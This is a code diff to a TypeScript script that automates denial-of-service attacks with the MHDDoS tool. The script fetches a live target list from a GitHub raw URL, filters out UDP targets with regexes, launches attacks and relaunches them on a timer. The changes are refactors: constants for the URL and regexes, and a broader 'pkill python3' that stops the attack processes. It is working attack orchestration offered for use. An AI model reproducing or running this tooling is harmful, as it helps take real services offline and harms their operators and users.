@@ -26,8 +26,11 @@ type LongArg = `--${string}=${string}`;
 
 // ===== CONSTANTS
 
+const TARGETS_URL = 'https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets';
 const SECOND = 1;
 const MINUTE = SECOND * 60;
+const ACTIVE_UDP_TARGETS_REGEX = /^(?=[^#]*udp:\/\/|\budp\b).+$/gim;
+const ACTIVE_NON_UDP_TARGETS_REGEX = /^((?!.*udp)([^#].)+?)$/gim;
 
 // ===== ARGUMENTS
 
@@ -63,8 +66,6 @@ const mhddosFlags = parseFlags(mhddosArgs);
 
 // ===== RUN
 
-// $`htop`;
-
 await startAttack();
 
 const intervalId = setInterval(async () => {
@@ -72,7 +73,7 @@ const intervalId = setInterval(async () => {
   await startAttack();
 }, Math.max(MINUTE * 5, restartInterval) * 1000);
 
-// handling Ctrl+C
+// properly handling Ctrl+C
 process.on('SIGINT', function () {
   clearInterval(intervalId);
   process.exit();
@@ -110,7 +111,7 @@ async function startAttack(): Promise<void> {
 }
 
 async function stopAttack(): Promise<void> {
-  await quiet(nothrow($`pkill -f runner.py`));
+  await quiet(nothrow($`pkill python3`));
 
   console.log(chalk(`\nStopped attacks, updating targets.\n\n${'-'.repeat(50)}\n`));
 }
@@ -134,7 +135,7 @@ async function getRandomTargets(): Promise<string[]> {
 async function getTargetList(): Promise<string[]> {
   console.log(chalk('Getting targets...'));
 
-  const response = await fetch('https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets');
+  const response = await fetch(TARGETS_URL);
 
   if (!response.ok) {
     console.log(chalk.redBright('Failed to get targets.'));
@@ -145,12 +146,12 @@ async function getTargetList(): Promise<string[]> {
   const fileContent = await (response.ok ? response.text() : Promise.resolve(''));
 
   // show warning if there are active UDP targets
-  if (/^(?=[^#]*udp:\/\/|\budp\b).+$/gim.test(fileContent)) {
+  if (ACTIVE_UDP_TARGETS_REGEX.test(fileContent)) {
     console.log(chalk.yellowBright('There are UDP targets that are not supported by this tool. They were ignored.'));
   }
 
   // getting all active non-UDP targets
-  const rawTargets = fileContent.match(/^((?!.*udp)([^#].)+?)$/gim) || [];
+  const rawTargets = fileContent.match(ACTIVE_NON_UDP_TARGETS_REGEX) || [];
   // cleaning out all extra stuff
   const targets = rawTargets.map((target) => target.replace('runner.py ', '').trim());
 
